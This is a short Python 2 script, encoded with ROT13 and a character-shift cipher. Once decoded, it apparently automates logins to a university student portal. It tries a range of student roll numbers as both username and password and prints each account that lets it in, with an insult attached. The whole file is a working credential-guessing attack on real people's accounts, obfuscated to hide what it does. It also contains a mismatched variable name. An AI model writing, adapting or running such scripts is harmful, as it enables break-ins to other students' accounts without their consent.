# TCZF VF QRNQ. EVC.

vzcbeg zrpunavmr

vqvbg = ""
pbbxrqzrng = ""
gbxra = "vhhd;00udag/oafwhobsh/sri0udwg0ghirsbh0wbrsl/dvd"
enjivpgbel = "vhhd;00udag/oafwhobsh/sri0udwg0ghirsbh0vcas/dvd"
ebyycersvk = "PO.RA.H4PFR" # Punatr zr.
qrs yrtvg_znxre(gbxra) :
	pbbxrqzrng=""
	sbe v va gbxra:
		pbbxrqzrng+=pue(beq(v)-1)
	erghea pbbxrqzrng

qrs unpx(v) :
	oebjfre = zrpunavmr.Oebjfre()
	oebjfre.bcra(yrtvg_znxre(gbxra))
	oebjfre.fryrpg_sbez(ae = 0)
	hfe = ebyy_cersvk +fge(v)
	cevag "Gelvat" + hfe
	oebjfre.sbez['hfrevq'] = hfe
	oebjfre.sbez['cnffjq'] = hfe
	oebjfre.fhozvg()
	vs(oebjfre.trghey() == yrtvg_znxre(enjivpgbel)):
		cevag hfe+ " vf n qbhpuront"

sbe v va enatr(14240, 14245):
	unpx(v)

